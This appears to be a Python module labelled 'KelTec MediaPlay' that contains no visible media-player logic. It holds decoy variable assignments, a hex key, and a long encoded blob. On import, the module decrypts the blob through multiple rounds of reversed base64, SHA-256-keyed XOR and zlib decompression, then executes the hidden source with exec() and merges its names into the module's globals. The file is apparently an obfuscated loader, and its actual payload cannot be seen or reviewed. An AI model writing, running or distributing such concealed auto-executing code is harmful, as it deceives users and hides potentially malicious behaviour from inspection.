# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 470273 ^ 310493
_lx1_1 = len("8cba44")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-983538)
_lx3_3 = 509023 * 0
_lx4_4 = 583409 ^ 647154
_K = '5e31dac8b73884635e98cc170746f07632e29e2195a112b53ade7393cf48bb67'
_M = 'chdi8HZm/iGIGNUmOm6I4KMufDx7hhgWzlrmFEOigXwkHmfyfnuuIIcZjnc+PY/ooit9YX+JGkDOWr1JRfeBIHdMZKQjLPMl1kuJ'
_D = '==Ap65NiZJFi3DuNgF8Sy7twUfEJLqcU9PHEvexIMYbj+pvwRRj0ouifCesYdhbdt+h3a8BA/VrfdvTvcrVrmBCS3XEP670gRWNImBbHD86gDzyz0lcWQTcAUxmcVz4CY2M9AvoeCOM4IAelQ07cwmawmrw64hal3qst02uUCTx4/xByZOLNg2EWU9edPHghFAamSutlp5A6UcH2hOCO2Pnf/VbG554VYHaYUMLHJ8sKgVS3FlJjPE4XMC3WTmvf1X8bXCaXWa5Q2CNGUYc6ThmK6+E31O5h5COIMUOsyyqMCNN0GeXx3aOMkzMmAe8nKgMVjCXDNKk6s/ALJHz6zeWZlJjlmN0EFUCycVr/vlqmWXNA9dKUKAgRN2uZGOIqdfLd1TImw7Q22eYPYshzpW7y6YiTIhG2WILCqJuscrT/aT8R2llUNNhrk6GWAs5Jthgj7obkI88ha3fcsHyZkwOVb0V7oHg1lImkCPwtxwpppkenSoef6m02tQDoOFzlQqan/48OpYXWnpPsHagroAw5Rb+crrOt2TlkOm8AMPT0kyzylZDUMWvCQufpoh3Ulx9lmrLnJ00Uhtmp0CPvkKHexEb2Slx0g6ASGKvDwkqKaaLPCxjlIlsQaGpUKM1nMoxGTGnIfgyS+XalTgfnaAjkBPj+JNXmgSsfrOaiCtvjNUsMp5Gi3Ixisfhyzy0nq5/+RoXXoYOWGx7/p4EjMx8uhx2Ym++iS7fV+G7CZLFWKZDFUpT59YAhUc6Z4CaH58ehuUaHqVjGtYvbFP+bXrlEwLGl3CsQKDboip1gCt4fZ9vU6HsrAJ6SHDL7/AzKbJP8+AvCNaB0FTNO6Y5/n4mONaJrASyyVr7UElHDMOGCDYjbM4Uz1UnuU3U6fpxt6VL+qxFJOSA1t1hAmXXp0ZrLFzhfX+Km0pDSVJ3Pgs5A9oJJxMcJyolI6No12ljJ6tQBnY26AAVv6HT9//cM7UVhwsuTbEJuBmAJa4Ij+1kd+qcoz6ljBqdTjwiMFbk+nd4VVhDaOBg19VCcfTGJ1GFjwEBrGjh4jgTfH6fegOpzOQRZrWyTaMjb57lMWptK3lTW2tpi44FtXKHK3Of5NpqGC5Y6irU3LThvJf6L0HsFHZeBJJL7+H8CQWzrYPrKwmYDINgOIwVhdvQs+DsXpRt/qHuTfPldvJILTeqEUCkoFoqpT82LRbOh7DV6G7hVdLmQj18UbQSOLMaoir9YKLDtO0qov127Khsa8KzqpFDdOkxlYui2SXuTZCgxiD/BVlFrkuX/W4DFxY5zLdAF+vRlRi98kgWXjvzmaMK3DuXJttD4mIUvzXxAAfRDJLp3vaiPXdXzmMaLwKt6BG3W4Epsu5lYYHZxKVh+1ZX0gKRSxckVDKNLq6vaqe0Qxqds0kVKt/soeme5ojz4wOMdPuprJ+J84cYY+Xbe0E6JerSCil6sUBWFUasZj21CYJYf91q3vxjysk2HYlwLz0qmYefpLiHVm/xaycKQrn1EWdBpIt1lcJUO/gUVHahRBfzxKpuigUu/nY3UxM5jJKz6DfdoOE6pvvmBUNfy/g7p2VIsk5aHxIJhHBT0ILEw/8PeVkmVcKbISn0RQaYBpCjzTus0cu9Rg3Ve4SI/G30RBr1t425A+8GDOyNbQ/9FG3mqNtS14qNOSqU/PhBBhYgCvtmK0SbUWA40sp9DOUjTxXr/3vzi6Sr8Tc6uON49'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})